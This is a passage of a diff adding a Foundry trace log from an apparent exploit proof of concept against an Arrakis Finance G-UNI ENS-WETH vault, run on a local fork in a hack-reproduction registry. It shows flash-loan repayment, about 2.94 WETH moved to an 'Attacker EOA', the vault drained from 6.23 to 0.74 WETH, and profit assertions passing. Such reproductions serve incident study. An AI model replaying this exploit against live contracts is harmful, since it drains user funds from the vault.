+    │   │   │   │   │   @ 0x6b918c1dbc325614d84d6c9444051d7bf2d78ee1ffdf105c85ea31f7bec4f486: 0x00000000000000000000000000000002b9f8d29f18ba02ed3878feb2b19bd814 → 0x00000000000000000000000000000005eb013eff1b4f87ca3b3480849d2d9059
+    │   │   │   │   │   @ 0x23192d3344ba125435847795d42ea16808782ce940b3eccf623e6bbf34474577: 0x00000000000000000000000000000005493a92093c788561fc90691385127775 → 0x00000000000000000000000000000003525320d4d2bb3b4d23e5e334b46bb145
+    │   │   │   │   │   @ 0x6b918c1dbc325614d84d6c9444051d7bf2d78ee1ffdf105c85ea31f7bec4f485: 0x0000000000000000000000000000000003a786fc353a52fb7c8a1e0446a10677 → 0x0000000000000000000000000000000879d3bd726430918206ba512c04a78d54
+    │   │   │   │   │   @ 0xe8d8f735cf87d0e9059bdccbbf5cdc13ef80f19de2bd94b113a0c30bc4e68eab: 0x010463da9a000000000000000000206c53486526b47b3660160003ab666ab4ac → 0x01662711dd00001b2600000000000d896162e99c58461c55b60003572be9662a
+    │   │   │   │   │   @ 0x4ad9c24ad7fe45191dbd89bbd96b37a220d27049e5799aade9c4c16d861519ff: 0x0000000000000000000000000000000000dba513a9ca3d3264a22e6d1d578ff9 → 0x000000000000000000000000000000087c9f9f5aefa0a74b1ea240c32df103d2
+    │   │   │   │   │   @ 0xfc6170dab3f5999689ffa458668d4024cdda4e00c34065ec8e3d53f323892fc9: 0x0000000000000000000000000000000000d500d88ac2afd562676bc92ecd79dd → 0x000000000000000000000000000000087ca643960ea834a820dd03671c7b19ee
+    │   │   │   │   │   @ 0x23192d3344ba125435847795d42ea16808782ce940b3eccf623e6bbf34474578: 0x010900d6820000000000000000002dedb80fcb7cb5988ff02f0007022cdb7a46 → 0x01618a15f500001b2600000000000007fc9b83465728c2c59d0000006578a090
+    │   │   │   │   │   @ 0xbb1b5c06eb74cba985bfd93adfd96780fae7897045fb9a86f836474a666f5c22: 0x00000000000000000000000000000001922600fdd39c475cca38018432f206da → 0x0000000000000000000000000000000715b3df39ca3821fcf23b40b6017785ba
+    │   │   │   │   │   @ 0x4f627853b62661dfad292d157bc0b937c9358827fa3ac615511d3b09e83c2907: 0x000000000000000000000000000000000a7cdc653e83b3dd96d1c87360ed9b0c → 0x0000000000000000000000000000000872fe68095ae7309fec72a6bcea5af8bf
+    │   │   │   │   │   @ 0xbf116f8b6dc34ed638559da1fcf7d1e65e709484f551901881f65d207add0c10: 0x00000000000000000000000000000004dfce67dc38feaf0bfa2e111a82d6920b → 0x00000000000000000000000000000003bd869bed784545a6c48a872bb1dfe4c7
+    │   │   │   │   │   @ 0xd5f5be7ef82d3e3c7f046a766e3a551b834a259ca2c1f43fba80f0e3cfa1c7a0: 0x010225c6aa00000000000000000015ddee3b223494c2d55af40001e0928a8931 → 0x01686525cd00001b2600000000001817c6702c8e77fe7d5ad8000521ffc991a5
+    │   │   │   │   │   @ 0x36b78b16f757214c7748592660e96b36003e9abd4febd182d5579bca5cccf2e5: 0x0000000000000000000000000000000003f8847b6050fc061b023047f1c3f97e → 0x000000000000000000000000000000087982bff33919e87768423ee859849a4d
+    │   │   │   │   │   @ 0x9434008338d50d53afb547bcb7ad09fa6652357cb64168ca095b6d0b6ab332c6: 0x0101874238000000000000000000125618b33098bf86ca7f2800015c5fa2cc70 → 0x016903aa3f00001b2600000000001b9f9bf81e2a4d3a8836a40005a632b14e66
+    │   │   │   │   │   @ 0x9434008338d50d53afb547bcb7ad09fa6652357cb64168ca095b6d0b6ab332c4: 0x00000000000000000000000000000000005b4936d7f14342519fb1e133dd1b64 → 0x000000000000000000000000000000087d1ffb37c179a13b31a4bd4f176b7867
+    │   │   │   │   │   @ 0xc0f945f00d11313808259f41de695cc2dfd179411012a6ace77a26aa476c0563: 0x0000000000000000000000000000000001bf424b6b90cda4e2602e426b8be894 → 0x000000000000000000000000000000087bbc02232dda16d8a0e440eddfbcab37
+    │   │   │   │   │   @ 0xc0f945f00d11313808259f41de695cc2dfd179411012a6ace77a26aa476c0565: 0x0103817dbf0000000000000000001ce4d169c91f7e9bfa166f0002fa6e30a185 → 0x0167096eb800001b2600000000001110e34185a38e25589f5d00040824237951
+    │   │   │   │   │   @ 0x4ad9c24ad7fe45191dbd89bbd96b37a220d27049e5799aade9c4c16d86151a01: 0x01027a84e0000000000000000000179b68176f8bde5e01d6fc00022618024451 → 0x016810679700001b260000000000165a4c93df372e6350ded00004dc7a51d685
+    │   │   │   │   │   @ 2: 0x0000000000000000000000000000000896f61e37ce56e395b979c870ecd413e8 → 0x00000000000000000000000000000008b578d06e0d68cfb77977796d8a8f07ce
+    │   │   │   │   │   @ 0x2672d6e2bdaba87886263d564a2e18bb52c4b294919033b5ff7e6aad6bf66c4d: 0x0108fd40ee0000000000000000002dec6c17fef43cb929958900070000fb8eb7 → 0x01618dab8900001b260000000000000948934fced00829204300000291588c1f
+    │   │   │   │   │   @ 0xe8d8f735cf87d0e9059bdccbbf5cdc13ef80f19de2bd94b113a0c30bc4e68eaa: 0x0000000000000000000000000000000210b1b3042ff3aa9c022f7ee59d227f16 → 0x00000000000000000000000000000006965768faec8eb8533c8a42b9dc24d2cf
+    │   │   │   │   │   @ 0x23192d3344ba125435847795d42ea16808782ce940b3eccf623e6bbf34474576: 0x000000000000000000000000000000000a9f3c917f6a3bb8ba3a9b1936c7c3bf → 0x0000000000000000000000000000000872dc07dd1a00a8c4c909d4171480d00c
+    │   │   │   │   │   @ 3: 0x000000000000000016750c51762b8f130000000000000000035d1898337280e7 → 0x000000000000000149b1f9acf809c6070000000000000000035d1898337280e7
+    │   │   │   │   │   @ 0xd5f5be7ef82d3e3c7f046a766e3a551b834a259ca2c1f43fba80f0e3cfa1c79e: 0x0000000000000000000000000000000000bda330de7377925f63e79a71e638d7 → 0x000000000000000000000000000000087cbda13dbaf76ceb23e08795d9625af4
+    │   │   │   │   │   @ 0x1efa840f8a1b77fdb58378ec490dba7c94b7e4ce966a789e61f1027cfaacd405: 0x0103306fd80000000000000000001ac6a7383c17c005d51033000297eb4d7a40 → 0x01675a7c9f00001b260000000000132f0d7312ab4cbb7da59900046aa706a096
+    │   │   │   │   │   @ 0xc0f945f00d11313808259f41de695cc2dfd179411012a6ace77a26aa476c0564: 0x00000000000000000000000000000001a231423e46f0fdffed3f412f268d2036 → 0x000000000000000000000000000000070712c8d62394e1423d2daa411e0a4811
+    │   │   │   │   │   @ 0x1efa840f8a1b77fdb58378ec490dba7c94b7e4ce966a789e61f1027cfaacd403: 0x00000000000000000000000000000000013c2deb5ff083bcae90164c6eb4fc7d → 0x000000000000000000000000000000087c3f1683397a60c0d4b458e3dc93974e
+    │   │   │   │   │   @ 0: 0x00016600960096003c007d3c0000000000000004f7b4ecf1be773dd00765e2dc → 0x00016600960096003c00e6900000000000000013205ba0849cc86bb76e8e4a1a
+    │   │   │   │   │   @ 0x2672d6e2bdaba87886263d564a2e18bb52c4b294919033b5ff7e6aad6bf66c4b: 0x000000000000000000000000000000000a8c9ce91c48846c575690818274d6ae → 0x0000000000000000000000000000000872eea7857d2260112beddeaec8d3bd1d
+    │   │   │   │   │   @ 0x40d66439f71349bebc2005ac22e96d690974dd0d1048b2a192c0d7fae6087296: 0x00000000000000000000000000000005b1340e97e550332637905bcca2f5c848 → 0x00000000000000000000000000000002f21a32c50c1f2c39bbb487be0aecd4c5
+    │   │   │   │   │   @ 0xc955c8552c52ebd49a57a58afc15a22c1415742cf1ff54074c7324a639374a89: 0x01048856fb0000000000000000002102ee9605952235631ff00003c76c84ffc9 → 0x016602957c00001b2600000000000cf2c615492dea8bef95dc00033b25cf1b0d
+    │   │   │   │   │   @ 0xfc6170dab3f5999689ffa458668d4024cdda4e00c34065ec8e3d53f323892fcb: 0x0102f3b4880000000000000000001a23f88a8d9ab23220307a00026da3e46218 → 0x01679737ef00001b26000000000013d1bc20c1285a8f328552000494ee6fb8be
+    │   │   │   │   │   @ 0xbb1b5c06eb74cba985bfd93adfd96780fae7897045fb9a86f836474a666f5c21: 0x0000000000000000000000000000000001bc295e9b99e7e739b679e61f6a7915 → 0x000000000000000000000000000000087bbf1b0ffdd0fc96498df54a2bde1ab6
+    │   │   │   │   │   @ 0x4ad9c24ad7fe45191dbd89bbd96b37a220d27049e5799aade9c4c16d86151a00: 0x00000000000000000000000000000000f2f2ce15cb8a87be05f5fbf465ea3431 → 0x00000000000000000000000000000007b8bbb89b2326a31c5d2ab21609a2a3b4
+    │   │   │   │   │   @ 0x4baf310dda4757b282ea0389c3312f448a78aa799fbf6818cb6e1ab24456fe83: 0x01008ba40c0000000000000000000ab6e7eb593f11e33bf88100007fe4fb1eb4 → 0x0169ff486b00001b260000000000233eccbff583fade16bd4b000682ad58fc22
+    │   │   │   │   │   @ 0xc955c8552c52ebd49a57a58afc15a22c1415742cf1ff54074c7324a639374a87: 0x0000000000000000000000000000000002e8567947015f4d507b0af5c33882a8 → 0x000000000000000000000000000000087a92edf55269853032c9643a88101123
+    │   │   │   │   │   @ 0x3f11420a9b4b2bc04523fd4836da0c818b52d5ca1c0563ea905361bf920dfa25: 0x00000000000000000000000000000004d189e9ad6d3b39391e08713c56ec04b9 → 0x00000000000000000000000000000003c86be55d44abf64061088cd5e9281e19
+    │   │   │   │   │   @ 0x3f11420a9b4b2bc04523fd4836da0c818b52d5ca1c0563ea905361bf920dfa26: 0x0108ff9ba40000000000000000002ded939302c9b979c89cce00070148843a8a → 0x01618b50d300001b260000000000000821184bf953478a18fe00000149cfe04c
+    │   │   │   │   │   @ 0x4baf310dda4757b282ea0389c3312f448a78aa799fbf6818cb6e1ab24456fe82: 0x0000000000000000000000000000000032871eea3da6ed0f480c1fd62099a100 → 0x0000000000000000000000000000000881ad6c91bc4eac5ab0e5b5ecd61f726c
+    │   │   │   │   │   @ 0x0d70f5f941b8f2971a279604d75022147da282e1ca49a9fc834c22d023c3a0db: 0x000000000000000000000000000000000b160e1a06f27f948c5ec6ff571f82c2 → 0x0000000000000000000000000000000872653654927864e8f6e5a830f4291109
+    │   │   │   │   │   @ 0x4f627853b62661dfad292d157bc0b937c9358827fa3ac615511d3b09e83c2909: 0x010900525e0000000000000000002ded95a1c9b6c907a6ebce000701d3bc3f21 → 0x01618a9a1900001b26000000000000081f09850c43b9abc9fe000000be97dbb5
+    │   │   │   │   │   @ 4: 0x0000000000000000000000000000000000000000000000202ab55e17ece76492 → 0x000000000000000000000000000000000000000000000028cf083861a8e2bdac
+    │   │   │   │   │   @ 0x0d70f5f941b8f2971a279604d75022147da282e1ca49a9fc834c22d023c3a0dd: 0x01090118310000000000000000002dedc2c1a2f0a09ce827900007025f95fd34 → 0x016189d44600001b2600000000000007f1e9abd26c246a8e3c00000032be1da2
+    │   │   │   │   │   @ 0x0d70f5f941b8f2971a279604d75022147da282e1ca49a9fc834c22d023c3a0dc: 0x000000000000000000000000000000058414848df875704bd265dc7effb63c00 → 0x0000000000000000000000000000000313f8aae7a0c5fdec6f460f83008e2877
+    │   │   │   │   │   @ 0xc955c8552c52ebd49a57a58afc15a22c1415742cf1ff54074c7324a639374a88: 0x000000000000000000000000000000025a019916532cc0417682eb37f73f100b → 0x000000000000000000000000000000064cc34d7d36074ee2ed4866ef8e7f3e6c
+    │   │   │   │   │   @ 0x4baf310dda4757b282ea0389c3312f448a78aa799fbf6818cb6e1ab24456fe81: 0x000000000000000000000000000000000020b231c895662b0ef89e6a8a095756 → 0x000000000000000000000000000000087d5a923cd0d57e52744bd0c5c13f3c75
+    │   │   │   │   │   @ 0x3f11420a9b4b2bc04523fd4836da0c818b52d5ca1c0563ea905361bf920dfa24: 0x000000000000000000000000000000000968d0abca0b6b803b191285bde37b8d → 0x00000000000000000000000000000008741273c2cf5f78fd482b5caa8d65183e
+    │   │   │   │   │   @ 0x4f627853b62661dfad292d157bc0b937c9358827fa3ac615511d3b09e83c2908: 0x000000000000000000000000000000053f8c9d26975cc250a62d2a5eae700e3a → 0x000000000000000000000000000000035c7856650aa84333e7b27c435abc24cb
+    │   │   │   │   │   @ 0x36b78b16f757214c7748592660e96b36003e9abd4febd182d5579bca5cccf2e6: 0x0000000000000000000000000000000268bbf99936e12a5c0a75502cb4ee3b99 → 0x000000000000000000000000000000062ef7fa0839fdc4d2d7c3a23f59413a19
+    │   │   │   │   └─ ← [Return] -145912552914211066480 [-1.459e20], 13283298507313887894451 [1.328e22]
+    │   │   │   ├─ [24420] WETH::approve(Morpho Blue: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 1800000000000000000000 [1.8e21])
+    │   │   │   │   ├─ emit Approval(owner: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Morpho Blue: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], amount: 1800000000000000000000 [1.8e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd6996144845102bd86620aac998104e144b9eb08ee4aa252c323a7f96139f67f: 0 → 0x00000000000000000000000000000000000000000000006194049f30f7200000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4148] WETH::transferFrom(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Morpho Blue: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 1800000000000000000000 [1.8e21])
+    │   │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Morpho Blue: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], amount: 1800000000000000000000 [1.8e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd6996144845102bd86620aac998104e144b9eb08ee4aa252c323a7f96139f67f: 0x00000000000000000000000000000000000000000000006194049f30f7200000 → 0
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000061bcd665c0d7b39a14 → 0x00000000000000000000000000000000000000000000000028d1c68fe0939a14
+    │   │   │   │   @ 0x9ddf8259b5dfabc9e47e107236a6121103d753bff80b7accad156017de069d9a: 0x0000000000000000000000000000000000000000000002574c41ffd2da7cabc2 → 0x0000000000000000000000000000000000000000000002b8e0469f03d19cabc2
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return]
+    │   ├─ [534] WETH::balanceOf(ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 2941350352900037140 [2.941e18]
+    │   ├─ [23162] WETH::transfer(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44], 2941350352900037140 [2.941e18])
+    │   │   ├─ emit Transfer(from: ArrakisFinanceExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44], amount: 2941350352900037140 [2.941e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x32c65c7270cf1c29022110eeb432d4f7eae38c87b31be6924030214fc9ea3935: 0 → 0x00000000000000000000000000000000000000000000000028d1c68fe0939a14
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000028d1c68fe0939a14 → 0
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [534] WETH::balanceOf(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44]) [staticcall]
+    │   └─ ← [Return] 2941350352900037140 [2.941e18]
+    ├─ emit log_named_decimal_uint(key: "Vault WETH before", val: 6233955217024577008 [6.233e18], decimals: 18)
+    ├─ [534] WETH::balanceOf(G-UNI ENS-WETH vault: [0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe]) [staticcall]
+    │   └─ ← [Return] 744208051862832701 [7.442e17]
+    ├─ emit log_named_decimal_uint(key: "Vault WETH after", val: 744208051862832701 [7.442e17], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker WETH profit", val: 2941350352900037140 [2.941e18], decimals: 18)
+    ├─ [0] VM::assertGt(2941350352900037140 [2.941e18], 2900000000000000000 [2.9e18], "WETH profit too small") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertApproxEqAbs(2941350352900037140 [2.941e18], 2941350352900037140 [2.941e18], 50000000000000000 [5e16], "WETH profit mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1264] WETH::symbol() [staticcall]
+    │   └─ ← [Return] "WETH"
+    ├─ [534] WETH::balanceOf(Attacker EOA: [0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44]) [staticcall]
+    │   └─ ← [Return] 2941350352900037140 [2.941e18]
+    ├─ [444] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit WETH Balance", val: 2941350352900037140 [2.941e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 45.20ms (28.64ms CPU time)
+
+Ran 1 test suite in 2.46s (45.20ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/workspaces/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 79602 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /workspaces/RustroverProjects/audits/evm-hack-registry/2026-08-ArrakisFinance_exp)
